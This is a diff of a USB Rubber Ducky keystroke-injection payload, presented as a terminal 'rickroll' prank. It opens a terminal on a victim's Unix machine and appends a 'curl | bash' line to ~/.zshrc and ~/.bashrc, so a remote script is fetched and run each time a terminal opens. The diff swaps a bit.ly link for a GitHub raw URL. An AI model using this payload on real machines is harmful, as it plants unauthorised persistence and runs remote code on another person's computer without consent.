@@ -1,10 +1,13 @@
 REM Title: Terminal RickRoll Tux mean style
-REM Author: FalsePhilosopher
-REM Target:  Unix-like tested on kubuntu 22.04.
-REM Props: Hak5, the community and memes
-REM Version: 1.0
+REM Author: Keroserene/FalsePhilosopher
+REM Target:  Unix-like
+REM Props:  keroserene and memes
+REM Version: 1.2
 REM Category: Prank
-REM Everybody loves a good ole rickroll, now in terminal flavor! Note that if you close the terminal the audio still keeps running till you either kill the process or wait out the whole song. This version launches it every time your friend opens a terminal.
+REM Everybody loves a good ole rickroll, now in terminal flavor! 
+REM Originally written by keroserne https://github.com/keroserene/rickrollrc adapted to ducky by FalsePhilosopher.
+REM Note that if you close the terminal the audio still keeps running till you either kill the process or wait out the whole song. Easily modified to work on osx or WSL.
+REM This launches the script every time your friend opens a terminal.
 REM
 DELAY 300
 REM Minimize all windows as that ensures launch happens smoother.
@@ -12,8 +15,4 @@ WINDOWS d
 DELAY 300
 CTRL-ALT t
 DELAY 2000
-STRING echo "curl -s -L http://bit.ly/10hA8iC | bash" >> ~/.zshrc && echo "curl -s -L http://bit.ly/10hA8iC | bash" >> ~/.bashrc
-DELAY 300
-ENTER
-DELAY 300
-ALT F4
+STRINGLN echo "curl -s -L https://raw.githubusercontent.com/FalsePhilosopher/rickrollrc/master/roll.sh | bash" >> ~/.zshrc && echo "curl -s -L https://raw.githubusercontent.com/FalsePhilosopher/rickrollrc/master/roll.sh | bash" >> ~/.bashrc && exit
